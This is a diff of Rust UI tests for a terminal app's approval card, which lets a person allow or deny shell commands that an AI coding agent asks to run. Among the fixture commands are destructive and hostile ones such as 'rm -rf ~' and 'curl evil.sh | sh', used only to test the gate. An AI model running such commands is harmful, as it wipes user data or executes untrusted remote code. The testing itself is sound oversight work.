+        assert!(harness.press_key("enter", Modifiers::default()));
+        assert_eq!(
+            held.sent().expect("an allow")["answer"]["decision"],
+            "allow"
+        );
+    }
+
+    #[test]
+    fn a_command_drawn_past_the_windows_edge_has_not_been_read() {
+        // A window shorter than the least the card is shortened to: the box
+        // shows the one line, below the window's edge, and a line nobody can
+        // see has not been read, however short the command.
+        // Shorter than the header and the line under it, so the command is
+        // below the edge whatever the card's lines measure.
+        let tiny = vec2f(WINDOW.x(), 30.);
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf ~");
+        harness.run_command("crook/tabs/answer-waiting");
+        harness.workspace_update(|workspace, ctx| workspace.settle_the_ask_card(ctx));
+        for _ in 0..3 {
+            harness.frame_sized(tiny);
+        }
+        assert!(
+            harness.workspace.read(&harness.app, |workspace, _| {
+                workspace
+                    .ask_card()
+                    .is_some_and(|card| !card.body().read_to_end())
+            }),
+            "a command drawn where the window does not reach was read"
+        );
+        harness.dispatch_workspace_action(
+            AskAction::Answer {
+                ask: held.id,
+                digest: held.digest,
+                decision: Choice::Allow,
+                by: Pressed::Keys,
+            }
+            .into(),
+        );
+        assert!(held.nothing_sent());
+
+        // The same card in a window that shows it is read at once.
+        let held = hold_request(&mut harness, pane, "s2", command("rm -rf ~", false), None);
+        harness.run_command("crook/tabs/answer-waiting");
+        harness.frame();
+        assert!(harness.workspace.read(&harness.app, |workspace, _| {
+            workspace
+                .ask_card()
+                .is_some_and(|card| card.body().read_to_end())
+        }));
+        assert!(held.nothing_sent());
+    }
+
+    #[test]
+    fn what_changes_on_the_card_while_it_is_up_never_moves_its_buttons() {
+        // A narrow card, a tab renamed to something long while it is up, and
+        // a question asked an hour ago: every line that can change stays on
+        // one line, so the buttons stay where the pointer was going.
+        let narrow = vec2f(320., WINDOW.y());
+        let mut harness = Harness::new(1);
+        let tab = harness.tab_ids()[0];
+        let pane = harness.focused_pane_id().expect("a pane");
+        hold(&mut harness, pane, "rm -rf build");
+        harness.run_command("crook/tabs/answer-waiting");
+        let deny_at = |harness: &mut Harness| {
+            harness.frame_sized(narrow);
+            let scene = harness.frame_sized(narrow);
+            word_in(&scene, RectF::new(Vector2F::zero(), narrow), "Deny")
+        };
+        let before = deny_at(&mut harness);
+        harness.workspace_update(|workspace, ctx| {
+            workspace.rename_tab(
+                tab,
+                Some("the tab whose name runs on past any card's edge and on".to_owned()),
+                ctx,
+            );
+        });
+        assert_eq!(deny_at(&mut harness), before, "a rename moved the buttons");
+        assert!(harness.press_key("escape", Modifiers::default()));
+
+        // The same question, asked long before the card came up: an hour
+        // less a second, or as long ago as the clock goes, since Windows
+        // counts an Instant from boot and a runner may not be an hour up.
+        let asked = AgentAsk {
+            agent: AskingAgent::Claude,
+            session: "s2".to_owned(),
+            cwd: "/home/someone/work/crook".to_owned(),
+            tty: 34819,
+            wait: 300,
+            request: command("rm -rf build", false),
+        };
+        let feed = Arc::new(Feed::for_verb(&Verb::AgentAsk(asked.clone())));
+        let long_ago = [3_599, 599, 61]
+            .into_iter()
+            .find_map(|seconds| {
+                std::time::Instant::now().checked_sub(std::time::Duration::from_secs(seconds))
+            })
+            .expect("a clock a minute old");
+        harness.workspace_update(|workspace, ctx| {
+            workspace
+                .asks_mut()
+                .add(
+                    asked,
+                    Found {
+                        pane,
+                        cannot_answer: None,
+                        tab_title: "crook".to_owned(),
+                    },
+                    feed,
+                    long_ago,
+                )
+                .expect("held");
+            workspace.asks_changed(ctx);
+        });
+        harness.run_command("crook/tabs/answer-waiting");
+        assert_eq!(
+            deny_at(&mut harness),
+            before,
+            "an older question moved the buttons"
+        );
+    }
+
+    #[test]
+    fn a_wheel_over_the_command_scrolls_it_and_the_buttons_stay_put() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let long: String = (1..=30)
+            .map(|line| format!("echo line {line}"))
+            .collect::<Vec<_>>()
+            .join("\n");
+        let held = hold(&mut harness, pane, &long);
+        open(&mut harness);
+        settle(&mut harness);
+        let deny = button_at(&mut harness, "Deny");
+        let scene = harness.frame();
+        let first = word_in(&scene, RectF::new(Vector2F::zero(), WINDOW), "echo line 1");
+
+        harness.dispatch(Event::ScrollWheel {
+            position: first,
+            delta: ScrollDelta::Lines(vec2f(0., -100.)),
+            modifiers: Modifiers::default(),
+        });
+        let text = card_text(&mut harness);
+        assert!(text.lines().any(|line| line == "echo line 30"), "{text}");
+        assert!(!text.lines().any(|line| line == "echo line 1"), "{text}");
+        assert_eq!(button_at(&mut harness, "Deny"), deny, "the buttons moved");
+        press(&mut harness, "Allow once");
+        assert_eq!(
+            held.sent().expect("an allow")["answer"]["decision"],
+            "allow"
+        );
+    }
+
+    #[test]
+    fn a_close_question_takes_the_card_down_and_wins_the_keyboard() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        harness.update_session(pane, |session| session.status = AgentStatus::NeedsInput);
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        assert_eq!(card_on(&harness), Some(held.id));
+
+        harness.dispatch_workspace_action(WindowAction::Close.into());
+        assert_eq!(
+            card_on(&harness),
+            None,
+            "the card stayed up under the close"
+        );
+        assert_eq!(harness.asking_about(), Some(vec![pane]));
+        assert_eq!(
+            harness.action_for("escape", Modifiers::default()),
+            Some(EndingAction::Cancel.into())
+        );
+
+        // And the card does not open over it.
+        open(&mut harness);
+        assert_eq!(card_on(&harness), None);
+        assert!(harness.press_key("escape", Modifiers::default()));
+        assert_eq!(harness.asking_about(), None);
+        assert!(held.nothing_sent());
+    }
+
+    #[test]
+    fn the_handler_refuses_without_the_card_for_another_ask_for_a_stale_digest_and_before_the_gates()
+     {
+        let mut harness = Harness::new(2);
+        let tabs = harness.tab_ids();
+        let away = harness.panes_of(tabs[0])[0];
+        let here = harness.focused_pane_id().expect("a pane");
+        let mine = hold(&mut harness, here, "make test");
+        let other = hold_request(&mut harness, away, "s2", command("rm -rf ~", false), None);
+        let answer = |held: &Held, digest: [u8; 32], by: Pressed| -> WorkspaceAction {
+            AskAction::Answer {
+                ask: held.id,
+                digest,
+                decision: Choice::Deny,
+                by,
+            }
+            .into()
+        };
+
+        // No card at all.
+        harness.dispatch_workspace_action(answer(&mine, mine.digest, Pressed::Pointer));
+        assert!(mine.nothing_sent());
+
+        // A card up on one question, a press about another.
+        open(&mut harness);
+        assert_eq!(card_on(&harness), Some(mine.id));
+        settle(&mut harness);
+        harness.dispatch_workspace_action(answer(&other, other.digest, Pressed::Pointer));
+        assert!(other.nothing_sent());
+        assert!(mine.nothing_sent());
+
+        // The question it is on, with a digest that is not its own.
+        harness.dispatch_workspace_action(WorkspaceAction::Asking(AskAction::NotNow));
+        open(&mut harness);
+        settle(&mut harness);
+        harness.dispatch_workspace_action(answer(&mine, other.digest, Pressed::Pointer));
+        assert!(mine.nothing_sent());
+        assert!(card_says(&mut harness, "This request changed or ended"));
+
+        // Before either gate.
+        for by in [Pressed::Keys, Pressed::Pointer] {
+            harness.dispatch_workspace_action(WorkspaceAction::Asking(AskAction::NotNow));
+            open(&mut harness);
+            harness.dispatch_workspace_action(answer(&mine, mine.digest, by));
+            assert!(mine.nothing_sent(), "{by:?} before the second was up");
+        }
+        assert_eq!(ended(&harness, mine.id), None);
+        assert_eq!(ended(&harness, other.id), None);
+    }
+
+    #[test]
+    fn allow_on_a_question_its_hook_gave_up_on_answers_nothing_and_says_so() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        let allow = button_at(&mut harness, "Allow once");
+
+        // Gone before the window has heard so: the Allow on screen is the
+        // one drawn while it was waiting.
+        held.feed.hang_up();
+        harness.click(allow, MouseButton::Left);
+
+        assert!(held.nothing_sent());
+        assert!(!matches!(ended(&harness, held.id), Some(How::Answered(_))));
+        assert_eq!(
+            card_on(&harness),
+            Some(held.id),
+            "the card closed as if sent"
+        );
+        assert!(card_says(&mut harness, "no longer waiting on this"));
+        assert!(card_says(&mut harness, "This request changed or ended"));
+        assert!(!card_says(&mut harness, "Allow once"));
+    }
+
+    #[test]
+    fn a_question_ending_under_the_card_turns_it_to_its_withdrawn_face() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        assert!(card_says(
+            &mut harness,
+            "Claude Code wants to run a command"
+        ));
+
+        // The turn it was asked in is over.
+        harness.workspace_update(|workspace, ctx| {
+            workspace.apply_terminal_update(
+                &TerminalUpdate::Agent {
+                    pane,
+                    status: AgentStatus::Idle,
+                    title: None,
+                    message: None,
+                },
+                ctx,
+            );
+        });
+
+        assert_eq!(card_on(&harness), Some(held.id));
+        let text = card_text(&mut harness);
+        assert!(
+            text.contains("Claude Code is no longer waiting on this"),
+            "{text}"
+        );
+        assert!(text.contains("turn ended"), "{text}");
+        assert!(text.contains("Go to tab"), "{text}");
+        assert!(text.contains("Close"), "{text}");
+        assert!(!text.contains("Allow once"), "{text}");
+        assert!(!text.contains("Deny"), "{text}");
+        // Its buttons wait again: what they would do has changed under them.
+        assert_eq!(harness.action_for("left", Modifiers::default()), too_soon());
+        press(&mut harness, "Close");
+        assert_eq!(card_on(&harness), None);
+    }
+
+    #[test]
+    fn a_done_on_its_own_withdraws_the_card_and_its_buttons_wait_again() {
+        // A failed or an interrupted tool's hook writes the done with no
+        // status behind it, and the done is all that ends the question.
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        let fingerprint = harness.workspace.read(&harness.app, |workspace, _| {
+            workspace
+                .asks()
+                .get(held.id)
+                .map(|ask| ask.fingerprint.clone())
+                .expect("held")
+        });
+
+        harness.workspace_update(|workspace, ctx| {
+            workspace.apply_terminal_update(
+                &TerminalUpdate::AskDone {
+                    pane,
+                    fingerprints: vec![
+                        crook_terminal::agent::Fingerprint::parse(&fingerprint)
+                            .expect("a question's fingerprint"),
+                    ],
+                },
+                ctx,
+            );
+        });
+
+        assert_eq!(
+            held.sent(),
+            Some(serde_json::json!({"answer": {"decision": "pass", "why": "answered-in-agent"}}))
+        );
+        assert_eq!(card_on(&harness), Some(held.id));
+        assert!(card_says(
+            &mut harness,
+            "It was answered in Claude Code's own tab, and the command has run."
+        ));
+        // What its buttons would do changed under them: they wait again.
+        assert_eq!(harness.action_for("left", Modifiers::default()), too_soon());
+        assert!(harness.workspace.read(&harness.app, |workspace, _| {
+            workspace
+                .ask_card()
+                .is_some_and(|card| !card.pointer_is_live(std::time::Instant::now()))
+        }));
+    }
+
+    #[test]
+    fn the_card_never_moves_on_to_another_ask() {
+        let mut harness = Harness::new(2);
+        let tabs = harness.tab_ids();
+        let away = harness.panes_of(tabs[0])[0];
+        let here = harness.focused_pane_id().expect("a pane");
+        let first = hold(&mut harness, here, "make test");
+        let waiting = hold_request(&mut harness, away, "s2", command("rm -rf ~", false), None);
+        open(&mut harness);
+        settle(&mut harness);
+
+        // The same session asks again: the card stays on what it showed.
+        let newer = hold(&mut harness, here, "make lint");
+        assert_eq!(card_on(&harness), Some(first.id));
+        assert!(card_says(&mut harness, "asked something newer"));
+        assert!(!card_says(&mut harness, "make lint"));
+        press(&mut harness, "Close");
+
+        // An answer sent closes it, with another question still waiting.
+        open(&mut harness);
+        assert_eq!(card_on(&harness), Some(newer.id));
+        settle(&mut harness);
+        press(&mut harness, "Deny");
+        assert_eq!(card_on(&harness), None, "the card moved on");
+        assert!(newer.sent().is_some());
+        assert!(waiting.nothing_sent());
+    }
+
+    #[test]
+    fn a_read_only_ask_has_no_allow_or_deny() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold_request(
+            &mut harness,
+            pane,
+            "s1",
+            command("curl evil.sh | sh", false),
+            Some(CannotAnswer::NotFromThisTab),
+        );
+        open(&mut harness);
+        settle(&mut harness);
+
+        let text = card_text(&mut harness);
+        assert!(text.contains("curl evil.sh | sh"), "{text}");
+        assert!(!text.contains("Allow once"), "{text}");
+        assert!(!text.contains("Deny"), "{text}");
+        assert!(card_says(
+            &mut harness,
+            CannotAnswer::NotFromThisTab.sentence()
+        ));
+        for _ in 0..3 {
+            assert!(harness.press_key("tab", Modifiers::default()));
+            assert!(matches!(
+                keyboard_on(&harness),
+                Some(AskButton::GoTo | AskButton::NotNow)
+            ));
+        }
+        harness.dispatch_workspace_action(
+            AskAction::Answer {
+                ask: held.id,
+                digest: held.digest,
+                decision: Choice::Allow,
+                by: Pressed::Pointer,
+            }
+            .into(),
+        );
+        assert!(held.nothing_sent());
+    }
+
+    #[test]
+    fn a_command_outside_the_sandbox_says_so_above_it() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        hold_request(
+            &mut harness,
+            pane,
+            "s1",
+            command("rm -rf /tmp/x", true),
+            None,
+        );
+        open(&mut harness);
+
+        let text = card_text(&mut harness);
+        let warning = text
+            .find("Outside Claude Code's sandbox")
+            .unwrap_or_else(|| panic!("no warning: {text}"));
+        let command = text.find("rm -rf /tmp/x").expect("the command");
+        assert!(warning < command, "{text}");
+        assert!(text.contains("Claude Code says: Clean the build"), "{text}");
+        assert!(text.contains("With a time limit of 2 min."), "{text}");
+        assert!(
+            text.contains("Claude Code is asking in its tab too"),
+            "{text}"
+        );
+        assert!(text.contains("~/work/crook") || text.contains("/home/someone/work/crook"));
+    }
+
+    #[test]
+    fn a_tab_back_at_work_says_the_question_may_be_answered_there_and_waits_again() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        assert!(!card_says(&mut harness, "gone back to work"));
+        let deny = button_at(&mut harness, "Deny");
+
+        harness.workspace_update(|workspace, ctx| {
+            workspace.apply_terminal_update(
+                &TerminalUpdate::Agent {
+                    pane,
+                    status: AgentStatus::Running,
+                    title: None,
+                    message: None,
+                },
+                ctx,
+            );
+        });
+
+        assert!(card_says(
+            &mut harness,
+            "Its tab has gone back to work; this may already be answered there."
+        ));
+        // The line moved the buttons: they wait again, so a press aimed
+        // where Deny was lands on nothing that answers.
+        harness.click(deny, MouseButton::Left);
+        assert_eq!(harness.action_for("tab", Modifiers::default()), too_soon());
+        assert!(held.nothing_sent());
+        assert!(!withdrawn(&harness));
+    }
+
+    #[test]
+    fn nothing_but_the_card_answers() {
+        let mut harness = Harness::new(2);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        let names: Vec<String> = harness.workspace.read(&harness.app, |workspace, _| {
+            workspace
+                .host()
+                .actions()
+                .names()
+                .into_iter()
+                .map(|(name, _)| name.to_string())
+                .collect()
+        });
+        assert!(names.len() > 20, "{names:?}");
+
+        // Every name, bound to a chord: what the chord means is the command
+        // it names, and never one of the card's presses.
+        // (Over the card itself every chord is taken, for nothing.)
+        let chord = Modifiers {
+            ctrl: true,
+            alt: true,
+            shift: true,
+            ..Modifiers::default()
+        };
+        let mut bound = 0;
+        for name in &names {
+            harness.bind(&format!(
+                r#"[{{"key": "ctrl+alt+shift+f9", "command": "{name}"}}]"#
+            ));
+            let meant = harness.action_for("f9", chord);
+            // A few decline where they do not apply: a block's, with no
+            // block selected.
+            bound += usize::from(meant.is_some());
+            assert!(
+                !matches!(meant, Some(WorkspaceAction::Asking(_))),
+                "{name} bound to a chord means {meant:?}"
+            );
+        }
+        assert!(
+            bound * 2 > names.len(),
+            "{bound} of {} were bound",
+            names.len()
+        );
+        open(&mut harness);
+        assert_eq!(harness.action_for("f9", chord), too_soon());
+        settle(&mut harness);
+        assert_eq!(harness.action_for("f9", chord), too_soon());
+        assert!(held.nothing_sent());
+
+        // And every one run as `--action` runs it, over a card up, settled
+        // and drawn on a question still waiting — so that nothing but the
+        // press itself would stand between the action and Allow. One that
+        // closed the pane ended its question, which passes, and the next is
+        // asked afresh; one that turned a plugin off leaves the card to be
+        // opened as the plugin's command opens it.
+        let mut asked = Vec::new();
+        let mut walked = names.clone();
+        // Those that turn a plugin off last, so that each takes as few of
+        // the names after it with it as it can.
+        walked.sort_by_key(|name| name.starts_with("crook/plugins/toggle-"));
+        let mut skipped = Vec::new();
+        for name in &walked {
+            let live = |harness: &Harness, held: &Held| {
+                harness.workspace.read(&harness.app, |workspace, _| {
+                    workspace.asks().get(held.id).is_some()
+                })
+            };
+            if asked.last().is_none_or(|held| !live(&harness, held)) {
+                let pane = harness.focused_pane_id().expect("a pane");
+                let session = format!("s{}", asked.len() + 1);
+                asked.push(hold_request(
+                    &mut harness,
+                    pane,
+                    &session,
+                    command("rm -rf build", false),
+                    None,
+                ));
+            }
+            let held = asked.last().expect("one asked");
+            if card_on(&harness) != Some(held.id) || withdrawn(&harness) {
+                harness.workspace_update(|workspace, ctx| {
+                    workspace.answer_waiting_agent(ctx);
+                });
+            }
+            settle(&mut harness);
+            assert_eq!(card_on(&harness), Some(held.id), "before {name}");
+            let action = ActionName::parse(name).expect("a registered name parses");
+            let id = harness.workspace.read(&harness.app, |workspace, _| {
+                workspace.host().action(&action)
+            });
+            let Some(id) = id else {
+                skipped.push(name.clone());
+                continue;
+            };
+            harness.dispatch_workspace_action(WorkspaceAction::Run(id));
+            harness.frame();
+            for held in &asked {
+                // A close may end a question, which passes; never an answer.
+                if let Some(sent) = held.sent() {
+                    assert_eq!(
+                        sent["answer"]["decision"], "pass",
+                        "{name} answered: {sent}"
+                    );
+                }
+                assert!(
+                    !matches!(ended(&harness, held.id), Some(How::Answered(_))),
+                    "{name} answered the question"
+                );
+            }
+        }
+        // Only a plugin's own switch, once an earlier one had turned off the
+        // plugin it belongs to.
+        assert!(
+            skipped
+                .iter()
+                .all(|name| name.starts_with("crook/plugins/toggle-")),
+            "{skipped:?}"
+        );
+    }
+
+    #[test]
+    fn the_status_is_untouched_by_an_answer() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        harness.update_session(pane, |session| {
+            session.status = AgentStatus::NeedsInput;
+            session.message = Some("Claude needs your permission".to_owned());
+        });
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        press(&mut harness, "Allow once");
+
+        assert!(held.sent().is_some());
+        let status = harness.workspace.read(&harness.app, |workspace, _| {
+            workspace
+                .tabs()
+                .pane(pane)
+                .map(|pane| pane.session().status)
+        });
+        assert_eq!(status, Some(AgentStatus::NeedsInput));
+        assert_eq!(ended(&harness, held.id), Some(How::Answered(Choice::Allow)));
+    }
+
+    #[test]
+    fn deny_sends_the_fixed_message() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        // By the keyboard this time: Shift-Tab twice from Not now, past Go
+        // to, and a second on Deny before Enter presses it.
+        assert!(harness.press_key("tab", shift()));
+        settle(&mut harness);
+        assert!(harness.press_key("tab", shift()));
+        assert_eq!(keyboard_on(&harness), Some(AskButton::Deny));
+        settle(&mut harness);
+        assert!(harness.press_key("enter", Modifiers::default()));
+
+        let sent = held.sent().expect("a deny");
+        assert_eq!(
+            sent,
+            serde_json::json!({"answer": {"decision": "deny", "message": DENIED}})
+        );
+        assert_eq!(DENIED, "Denied in Crook by the person at the keyboard.");
+        assert_eq!(card_on(&harness), None);
+    }
+
+    #[test]
+    fn why_this_status_says_how_the_last_three_questions_ended() {
+        let mut harness = Harness::new(1);
+        let tab = harness.tab_ids()[0];
+        let pane = harness.focused_pane_id().expect("a pane");
+        for (session, text) in [
+            ("s1", "one"),
+            ("s2", "two"),
+            ("s3", "three"),
+            ("s4", "four"),
+        ] {
+            let held = hold_request(&mut harness, pane, session, command(text, false), None);
+            open(&mut harness);
+            settle(&mut harness);
+            press(
+                &mut harness,
+                if text == "four" { "Allow once" } else { "Deny" },
+            );
+            assert!(held.sent().is_some());
+        }
+        harness.workspace_update(|workspace, _| {
+            let last = workspace.asks().history().last().map(|outcome| outcome.id);
+            workspace
+                .asks_mut()
+                .heard(crate::control::Notice::Delivered(last.expect("one ended")));
+        });
+
+        harness.open_tab_menu_on(tab, pane);
+        harness.run_command("crook/tabs/explain-status");
+        let text = explanation_text(&harness.frame()).expect("the panel is drawn");
+        assert!(
+            text.contains("Allow sent to Claude Code") && text.contains("hook took it"),
+            "{text}"
+        );
+        assert!(
+            text.contains("Bash: three") && text.contains("Denied in Crook"),
+            "{text}"
+        );
+        assert!(text.contains("Bash: two"), "{text}");
+        assert!(!text.contains("Bash: one"), "{text}");
     }
 }
